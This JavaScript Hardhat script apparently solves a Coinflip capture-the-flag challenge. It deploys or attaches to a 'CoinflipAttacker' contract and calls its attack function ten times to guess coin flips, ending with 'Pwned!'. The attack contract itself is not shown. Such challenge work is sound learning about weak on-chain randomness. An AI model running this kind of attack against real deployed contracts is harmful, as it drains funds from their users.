const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  await deployments.fixture("coinflip")
  const attacker = await ethers.getContract("CoinflipAttacker", deployer)

  /* Attack using an already deployed attacker contract */

  // console.log("Connecting...")
  // const contractFactory = await ethers.getContractFactory("CoinflipAttacker")
  // const attackerContract = await contractFactory.attach(
  //   "0x9b7C417BE960F4765992d87eEaD41472A49D5Cda"
  // )
  // const attacker = await attackerContract.connect(deployer)

  /* Running the attack and logging to console */

  console.log("Attacking...")
  for (let i = 1; i <= 10; i++) {
    console.log(`Guessing coin ${i}/10...`)
    const attack = await attacker.attack()
    await attack.wait(2)
  }
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
